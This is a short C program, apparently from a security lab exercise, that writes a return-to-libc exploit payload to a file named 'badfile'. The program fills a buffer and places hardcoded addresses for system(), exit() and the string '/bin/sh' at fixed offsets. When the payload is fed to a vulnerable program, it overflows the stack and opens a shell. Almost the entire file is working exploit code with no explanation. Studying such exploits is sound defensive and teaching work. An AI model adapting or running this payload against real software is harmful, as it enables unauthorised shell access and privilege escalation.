// ret_to_libc_exploit.c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
	char buf[400];
	FILE *badfile;

	memset(buf, 0xaa, 400); // fill the buffer with non-zeros

	*(long *) &buf[120] = 0xffffd444; // The address of "/bin/sh"
	*(long *) &buf[116] = 0xf7e04f80; // The address of exit()
	*(long *) &buf[112] = 0xf7e12420; // The address of system()

	badfile = fopen("./badfile", "wb");
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);

	return 0;
}
